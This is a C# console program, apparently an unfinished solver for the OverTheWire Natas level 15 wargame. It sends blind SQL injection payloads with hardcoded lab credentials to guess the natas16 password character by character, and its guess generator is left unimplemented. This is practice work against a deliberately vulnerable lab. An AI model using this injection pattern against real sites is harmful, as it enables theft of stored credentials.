using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Net;
using System.Text;
using Natas15.Console.Utility;

namespace Natas15.Console
{
    class Program
    {
        private const string Natas15Url = "http://natas15.natas.labs.overthewire.org/index.php?debug=true";
        private const string Natas15Username = "natas15";
        private const string Natas15Password = "AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J";
        private const string SuccessText = "This user exists";

        private static List<char> _validPasswordCharacters;

        static void Main( string[] args )
        {
            InitialiseValidPasswordCharacters();

            bool passwordCracked = false;
            string currentGuess = string.Empty;
            string httpResponse = string.Empty;

            while ( passwordCracked == false )
            {
                currentGuess = NextPasswordGuess();

                byte[] httpBodyData = Encoding.ASCII.GetBytes( $"username=natas16\" AND BINARY password LIKE \"{ currentGuess }%" );

                using ( var webClient = new WebClient() )
                {
                    webClient.Headers.Add( HttpHeader.ContentType, HttpContentType.FormUrlEncoded );
                    webClient.Credentials = new NetworkCredential( Natas15Username, Natas15Password );

                    httpResponse = Encoding.ASCII.GetString( webClient.UploadData( Natas15Url, httpBodyData ) );
                }

                if ( currentGuess.Length == 32 && httpResponse.Contains( SuccessText ) )
                {
                    passwordCracked = true;
                }
            }

            System.Console.WriteLine( $"The password is: { currentGuess }" );
        }

        private static void InitialiseValidPasswordCharacters()
        {
            _validPasswordCharacters = new List<char>();

            _validPasswordCharacters.AddRange( Enumerable.Range( '0', 10 ).Select( x => ( char )x ) );
            _validPasswordCharacters.AddRange( Enumerable.Range( 'A', 26 ).Select( x => ( char )x ) );
            _validPasswordCharacters.AddRange( Enumerable.Range( 'a', 26 ).Select( x => ( char )x ) );
        }

        private static string NextPasswordGuess()
        {
            throw new NotImplementedException();
        }
    }
}
